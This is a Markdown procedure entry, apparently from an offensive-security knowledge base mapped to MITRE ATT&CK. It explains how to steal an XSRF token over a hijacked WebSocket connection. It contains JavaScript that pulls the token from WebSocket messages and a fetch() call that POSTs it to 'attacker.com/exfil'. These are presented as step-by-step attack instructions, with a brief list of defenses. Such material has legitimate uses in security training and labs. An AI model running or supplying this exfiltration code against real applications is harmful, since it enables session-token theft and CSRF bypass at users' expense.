---
id: 123e4567-e89b-12d3-a456-426614174003
name: Steal-XSRF-TOKEN-via-Hijacked-Connection
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:35.962Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
tags:
  - cswsh
  - token-theft
  - xsrf
  - exfiltration
platforms:
  - Web
commands:
  - '[[commands/token-exfil-js]]'
tools:
  - '[[tools/PortSwigger-WebSocket-Lab]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---

# Steal-XSRF-TOKEN-via-Hijacked-Connection

## Summary

This procedure intercepts sensitive data, specifically the XSRF-TOKEN, from messages on a hijacked WebSocket connection and exfiltrates it to the attacker's server for use in subsequent attacks.

## Description

With the connection hijacked, the attacker listens for application messages containing tokens or user data. In the Stripo Inc vulnerability, the WebSocket transmitted the XSRF-TOKEN without encryption or access controls, allowing direct theft. The stolen token bypasses CSRF protections elsewhere in the app.

## Requirements

1. Active hijacked WebSocket connection
2. Attacker's exfiltration endpoint (e.g., a simple HTTP server)
3. JavaScript parser for message content (e.g., JSON extraction)
4. Victim interaction to trigger token transmission

## Defense

Defensive measures and detection strategies:

- Avoid transmitting sensitive tokens over WebSockets; use secure channels
- Encrypt WebSocket payloads end-to-end
- Implement rate limiting and anomaly detection on WebSocket traffic

## Objectives

1. Capture XSRF-TOKEN from intercepted messages
2. Exfiltrate token to attacker-controlled location
3. Validate token for further exploitation

## Instructions

### Step 1: Listen for Token Messages

**Context**: Attach a handler to parse incoming WebSocket messages for the XSRF-TOKEN.

**Command** ([[commands/token-exfil-js]]):
```javascript
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  if (data.token) {
    console.log('Token found:', data.token);
  }
};
```

> Parses JSON messages for a 'token' field. Expected output: Logged token if present in traffic.

### Step 2: Exfiltrate the Token

**Context**: Send the captured token to the attacker's server via a cross-origin HTTP request.

**Command** ([[commands/token-exfil-js]]):
```javascript
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify({token: data.token})
});
```

> Posts the token to attacker's endpoint. Expected output: 200 OK response confirming receipt.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/token-exfil-js]]

## Tools Used

- [[tools/PortSwigger-WebSocket-Lab]]

## Tags

- [[cswsh]]
- [[token-theft]]
- [[xsrf]]
- [[Exfiltration]]
